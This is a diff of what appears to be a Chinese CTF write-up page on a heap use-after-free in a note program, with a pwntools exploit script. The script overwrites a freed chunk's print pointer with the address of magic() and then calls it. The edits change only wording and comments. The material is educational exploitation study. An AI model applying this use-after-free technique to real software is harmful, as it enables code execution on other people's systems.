@@ -3982,7 +3982,7 @@ p.interactive()
 </code></pre>
 <p>​            接着如果put note，这个print函数就会调用这个<code>print note</code>字段。所以利用思路就是利用UAf然后修改chunk中<code>print note</code>字段的地址为<code>magic()</code>的地址，然后再尝试puts此chunk，就相当于调用了<code>magic()</code>。</p>
 <p>​        但是由于程序并没有直接给出edit的功能，我们需要想办法在合适位置构建fake chunk，使得chunk的print字段正好处于我们可以任意写入内容的fake chunk的content字段。</p>
-<p>​        需要注意的就是free note的过程是分别顺序先释放content chunk再释放put chunk，并且两个chunk的size不同，fastbin链表的种类也不同，分配的顺序也不同。</p>
+<p>​        需要注意的就是free note的过程是分别按顺序先释放content chunk再释放put chunk，并且两个chunk的size不同，fastbin链表的种类也不同，分配的顺序也不同。</p>
 <pre><code class="python">from pwn import *
 
 libc = ELF("/glibc/2.23/32/lib/libc-2.23.so")
@@ -4002,7 +4002,6 @@ def cmd(idx):
     p.recvuntil("Your choice :")
     p.sendline(str(idx))
 
-
 def add(size,content):
     cmd(1)
     p.recvuntil('Note size :')
@@ -4010,12 +4009,10 @@ def add(size,content):
     p.recvuntil("Content :")
     p.sendline(content)
 
-
 def free(idx):
     cmd(2)
     p.recvuntil('Index :')
     p.sendline(str(idx))
-
 
 def put(idx):
     cmd(3)
@@ -4025,24 +4022,23 @@ def put(idx):
 add(0x20,b"aabb")#chunk0 [chunk0_print(0x10),chunk0_content(0x20)]
 add(0x20,b"aabb")#chunk1 [chunk0_print(0x10),chunk0_content(0x20)]
 free(0)
-'''
-main_arena =&gt; chunk0_print(0x10) =&gt; chunk0_content(0x20)
-'''
+
+#main_arena =&gt; chunk0_print(0x10) =&gt; chunk0_content(0x20)
 free(1)
-'''
-fastbin:
-main_arena =&gt; chunk1_print(0x10) =&gt; chunk0_print(0x10) 
-main_arena =&gt; chunk1_content(0x20) =&gt; chunk0_content(0x20)
-'''
+#fastbin:
+#main_arena =&gt; chunk1_print(0x10) =&gt; chunk0_print(0x10) 
+#main_arena =&gt; chunk1_content(0x20) =&gt; chunk0_content(0x20)
+
 gdb.attach(p)
-add(8,p32(magic))#chunk2, with 0x10 puts_field and 0x8 content field ,the memory space is poniter to chunk1_print and chunk0_print 
+add(8,p32(magic))
+#chunk2, with 0x10 puts_field and 0x8 content field ,the memory space is poniter to chunk1_print and chunk0_print 
 put(0)
 
 p.interactive()
 </code></pre>
 <p>​        </p>
 <p>​        </p>
-<p>​        这个高亮怎么这么怪。</p>
+<p>​        这个高亮怎么这么怪，为什么多行注释当作字符串处理了啊。</p>
 <p>​        </p>
 <p>​        </p>
 </body></html>]]></content>
